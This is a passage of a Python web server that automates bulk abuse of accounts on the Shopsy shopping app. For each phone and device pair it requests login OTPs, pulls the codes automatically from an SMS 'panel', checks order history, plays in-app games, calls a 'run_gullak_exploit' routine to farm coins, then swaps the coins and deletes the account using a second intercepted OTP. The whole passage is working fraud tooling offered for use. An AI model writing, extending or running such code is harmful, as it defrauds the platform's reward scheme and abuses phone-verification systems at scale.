            continue
        if devices_only:
            device = line.strip()
            phone = None
            for panel in panels:
                phone = fetch_phone_from_device_id(panel, device)
                if phone:
                    break
            if phone:
                tasks.append((phone, device, panels[0]))
            else:
                await emit_to_all('error', {'message': f'No phone found for device {device}.'})
        else:
            parts = re.split(r'[,\s]+', line.strip())
            if len(parts) >= 2:
                phone = re.sub(r'\D', '', parts[0])
                device = parts[1]
                if not phone:
                    for panel in panels:
                        phone = fetch_phone_from_device_id(panel, device)
                        if phone:
                            break
                    if not phone:
                        await emit_to_all('error', {'message': f'No phone found for device {device}.'})
                        continue
                if len(phone) == 10:
                    tasks.append((phone, device, panels[0]))
                else:
                    await emit_to_all('error', {'message': f'Invalid phone: {parts[0]}'})
            else:
                device = line.strip()
                phone = None
                for panel in panels:
                    phone = fetch_phone_from_device_id(panel, device)
                    if phone:
                        break
                if phone:
                    tasks.append((phone, device, panels[0]))
                else:
                    await emit_to_all('error', {'message': f'Could not parse line: {line}'})

    if not tasks:
        await emit_to_all('error', {'message': 'No valid phone/device pairs.'})
        return

    await emit_to_all('processing_started', {'total': len(tasks)})

    # Process with semaphore
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    async def process_task(phone, dev_id, panel, idx, total):
        device_key = f"{dev_id}_{phone}"
        await emit_to_all('status', {'device': device_key, 'status': 'starting', 'phone': phone, 'index': idx+1, 'total': total})
        async def emit_cb(data):
            await emit_to_all('status', {'device': device_key, **data})
        client = AsyncShopsyClient(fast=True)
        client.set_emit_callback(emit_cb)
        try:
            async with client:
                await client.bootstrap()
                request_id = await client.send_otp(phone)
                # Auto-fetch OTP from panel
                otp = await client.poll_otp_from_panel(panel["url"], dev_id, panel["sender"])
                if not otp:
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'OTP not received from panel'})
                    return
                await client.verify_otp(phone, otp, request_id)

                if mode == 'check':
                    latest = await client.get_latest_order()
                    if latest is None:
                        eligible = True
                        msg = "No orders (new account)"
                    else:
                        order_date = latest.get("order_date")
                        eligible, msg, dt = client.check_deletion_eligibility(order_date)
                    await emit_to_all('status', {'device': device_key, 'status': 'done', 'eligible': eligible, 'message': msg})
                    return

                # Full mode
                latest = await client.get_latest_order()
                if latest is None:
                    eligible = True
                else:
                    order_date = latest.get("order_date")
                    eligible, msg, dt = client.check_deletion_eligibility(order_date)
                if not eligible:
                    await emit_to_all('status', {'device': device_key, 'status': 'done', 'eligible': False, 'message': msg})
                    return

                await emit_to_all('status', {'device': device_key, 'status': 'playing_games', 'eligible': True})
                game_coins, game_logs = await client.run_all_games()
                gullak_coins, gullak_logs = await client.run_gullak_exploit()
                total_coins = game_coins + gullak_coins

                # Coin swap confirmation – manual input needed
                loop = asyncio.get_event_loop()
                future = loop.create_future()
                task_inputs[device_key] = future
                await emit_to_all('await_input', {'device': device_key, 'type': 'confirm_swap', 'message': f'Confirm coin swap for {phone} (coins: {total_coins})', 'coins': total_coins})
                response = await future
                del task_inputs[device_key]
                if response.lower() != 'yes':
                    await emit_to_all('status', {'device': device_key, 'status': 'done', 'message': 'User cancelled', 'eligible': True, 'coins': total_coins})
                    return

                await emit_to_all('status', {'device': device_key, 'status': 'deleting'})
                tokens = client.export_session()
                del_client = ShopsyDeleteClient()
                if not del_client.import_session(tokens):
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Failed to import session for deletion'})
                    return
                if not del_client.verify_account_delete():
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Delete page verification failed'})
                    return
                flow_id = del_client.request_delete_otp()
                if not flow_id:
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Failed to request delete OTP'})
                    return
                # Auto-fetch delete OTP from panel
                delete_otp = await client.poll_otp_from_panel(panel["url"], dev_id, panel["sender"])
                if not delete_otp:
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Delete OTP not received'})
                    return
                if del_client.verify_delete_otp(flow_id, delete_otp):
                    await emit_to_all('status', {'device': device_key, 'status': 'done', 'eligible': True, 'deleted': True, 'coins': total_coins, 'message': 'Deleted successfully'})
                else:
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Delete OTP verification failed'})
        except Exception as e:
            await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': str(e)})

    for idx, (phone, dev_id, panel) in enumerate(tasks):
        asyncio.create_task(process_task(phone, dev_id, panel, idx, len(tasks)))

async def index(request):
    html = open('templates/index.html', 'r').read()
    return web.Response(text=html, content_type='text/html')

app = web.Application()
app.router.add_get('/', index)
app.router.add_get('/ws', ws_handler)

if __name__ == '__main__':
    web.run_app(app, host='0.0.0.0', port=5000)
